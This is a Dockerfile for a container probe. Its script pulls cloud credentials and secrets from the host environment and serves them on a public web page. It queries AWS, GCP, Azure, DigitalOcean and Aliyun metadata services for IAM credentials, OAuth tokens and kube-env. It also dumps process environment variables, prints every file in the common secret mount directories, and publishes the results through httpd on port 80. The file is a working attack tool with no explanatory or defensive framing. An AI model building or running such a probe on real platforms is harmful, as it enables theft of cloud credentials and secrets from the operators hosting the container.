FROM alpine:3.20
RUN apk add --no-cache busybox-extras
RUN printf '%s\n' \
'#!/bin/sh' \
'OUT=/www/index.html' \
'mkdir -p /www' \
'fetch(){ echo "=== $1 ==="; wget -qO- --timeout=5 --header="$2" "$3" 2>&1; echo; }' \
'walk(){ echo "=== WALK $1 ==="; ls -laR "$1" 2>&1 | head -60; find "$1" -type f 2>/dev/null | while read f; do echo "--- FILE $f"; cat "$f" 2>&1; echo; done; echo; }' \
'{' \
'echo "### ETC_HOSTS"; cat /etc/hosts 2>&1; echo' \
'echo "### ETC_RESOLV"; cat /etc/resolv.conf 2>&1; echo' \
'fetch "GCP_METADATA" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"' \
'fetch "GCP_INSTANCE" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"' \
'fetch "GCP_PROJECT" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"' \
'fetch "GCP_ATTR" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"' \
'fetch "GCP_K8S" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"' \
'fetch "AWS_IMDSv1" "" "http://169.254.169.254/latest/meta-data/"' \
'fetch "AWS_IAM" "" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"' \
'fetch "AZURE_INSTANCE" "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' \
'fetch "AZURE_IDENTITY" "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' \
'fetch "DIGITALOCEAN" "" "http://169.254.169.254/metadata/v1.json"' \
'fetch "ALIYUN" "" "http://100.100.100.200/latest/meta-data/"' \
'fetch "K8S_API" "" "https://10.96.0.1/api/"' \
'fetch "CONTROL_EXAMPLE" "" "http://example.com/"' \
'echo "### PROC_1_ENVIRON"; tr "\000" "\n" < /proc/1/environ 2>&1; echo' \
'echo "### PROC_SELF_ENVIRON"; tr "\000" "\n" < /proc/self/environ 2>&1; echo' \
'walk /secrets' \
'walk /run/secrets' \
'walk /var/run/secrets' \
'walk /alloc' \
'walk /local' \
'echo "### MOUNTS"; cat /proc/mounts 2>&1; echo' \
'echo "### LISTEN"; netstat -lntp 2>&1; echo' \
'} > "$OUT" 2>&1' \
'exec httpd -f -p 80 -h /www' \
> /probe.sh && chmod +x /probe.sh
EXPOSE 80
CMD ["/bin/sh", "/probe.sh"]
